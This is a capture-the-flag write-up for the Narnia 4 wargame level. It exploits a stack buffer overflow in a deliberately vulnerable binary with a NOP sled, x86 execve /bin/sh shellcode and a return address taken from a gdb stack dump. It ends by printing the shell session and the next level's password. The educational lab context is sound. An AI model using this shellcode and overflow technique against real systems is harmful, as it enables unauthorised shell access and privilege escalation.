# Writeup for Narnia 4
So we analyze the C code and we see this

```text
    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

```
All this is doing is setting each individual char in the ith environ string to /0 and environ is an array of string literals. 
Okie, let's see something else

We find the offset is 264 and we are able to get buffer overflow

## Proof of Concept
```text
┌──(hanoz㉿kali)-[~/Desktop/htb/challenges/narnia]
└─$ python -c 'print "A"*264 + "BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Cool, gg now we just need to figure out where to direct stuff. to get shell. 

Let's just find shellcode in the stack? I don't see how we can write into the env variable so 

## Completed Exploit

Let's make the NOP sled and then the shellcode
```text
python -c 'print "\x90"*240 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"  + "\xd8\xd7\xff\xff"' 
```

Let's also get the value of the address where we can hit the NOP sled.
To do this, we set a breakpoint before strcpy and then execute the buffer overflow payload. Now we just search everything below EBP and we will eventually get the buffer.
```text
(gdb)  r `python -c 'print "\x90"*240 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"  + "BBBB"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia4 `python -c 'print "\x90"*240 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"  + "BBBB"'`

Breakpoint 1, 0x08048524 in main ()
(gdb) x/200xw $ebp
0xffffd5b8:     0x80cd0bb0      0x42424242      0x00000000      0xffffd654
0xffffd5c8:     0xffffd660      0x00000000      0x00000000      0x00000000
0xffffd5d8:     0xf7fc5000      0xf7ffdc0c      0xf7ffd000      0x00000000
0xffffd5e8:     0x00000002      0xf7fc5000      0x00000000      0x4e5b4439
0xffffd5f8:     0x74b44829      0x00000000      0x00000000      0x00000000
0xffffd608:     0x00000002      0x080483b0      0x00000000      0xf7fee710
0xffffd618:     0xf7e2a199      0xf7ffd000      0x00000002      0x080483b0
0xffffd628:     0x00000000      0x080483d1      0x080484ab      0x00000002
0xffffd638:     0xffffd654      0x08048530      0x08048590      0xf7fe9070
0xffffd648:     0xffffd64c      0xf7ffd920      0x00000002      0xffffd780
0xffffd658:     0xffffd790      0x00000000      0xffffd89d      0xffffd8b0
0xffffd668:     0xffffde6c      0xffffdea1      0xffffdeb0      0xffffdec1
0xffffd678:     0xffffded6      0xffffdee3      0xffffdeef      0xffffdef8
0xffffd688:     0xffffdf0b      0xffffdf2d      0xffffdf40      0xffffdf4c
0xffffd698:     0xffffdf63      0xffffdf73      0xffffdf87      0xffffdf92
0xffffd6a8:     0xffffdf9a      0xffffdfaa      0x00000000      0x00000020
0xffffd6b8:     0xf7fd7c90      0x00000021      0xf7fd7000      0x00000010
0xffffd6c8:     0x178bfbff      0x00000006      0x00001000      0x00000011
0xffffd6d8:     0x00000064      0x00000003      0x08048034      0x00000004
0xffffd6e8:     0x00000020      0x00000005      0x00000008      0x00000007
0xffffd6f8:     0xf7fd9000      0x00000008      0x00000000      0x00000009
0xffffd708:     0x080483b0      0x0000000b      0x000036b4      0x0000000c
0xffffd718:     0x000036b4      0x0000000d      0x000036b4      0x0000000e
0xffffd728:     0x000036b4      0x00000017      0x00000001      0x00000019
0xffffd738:     0xffffd76b      0x0000001a      0x00000000      0x0000001f
0xffffd748:     0xffffdfe8      0x0000000f      0xffffd77b      0x00000000
0xffffd758:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd768:     0x1d000000      0x629fdfbc      0x73e358f8      0x72dddffd
0xffffd778:     0x692dc22a      0x00363836      0x72616e2f      0x2f61696e
0xffffd788:     0x6e72616e      0x00346169      0x90909090      0x90909090
0xffffd798:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd7a8:     0x90909090      0x90909090      0x90909090      0x90909090
```

Here we have it, I have a random address in the sled 0xffffd7d8.

GG, now we send the payload and we have shell. 

```text
narnia4@narnia:/narnia$ ./narnia4 `python -c 'print "\x90"*240 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"  + "\xd8\xd7\xff\xff"'`
$ cat /etc/narnia_pass/narnia5
faimahchiy
```

The password to the next level is 
```
faimahchiy
```